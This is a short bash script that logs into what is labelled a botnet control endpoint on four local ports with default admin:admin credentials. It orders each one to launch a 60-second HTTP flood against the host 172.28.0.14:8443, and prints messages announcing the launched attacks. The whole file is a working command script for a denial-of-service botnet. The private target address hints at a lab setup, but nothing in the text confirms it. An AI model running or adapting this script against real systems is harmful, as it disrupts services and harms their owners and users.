#!/bin/bash

# Function to send attack request
send_attack() {
    local port=$1
    curl -X POST -u admin:admin -H "Content-Type: application/json" \
         -d '{"target": "172.28.0.14:8443", "duration": 60, "type": "http"}' \
         http://localhost:$port/botnet/attack &
}

echo "[+] Launching attacks..."

# Execute all requests simultaneously
send_attack 12381
send_attack 12382
send_attack 12383
send_attack 12384

# Wait for all background processes to finish
wait

echo "[+] All attacks launched!"
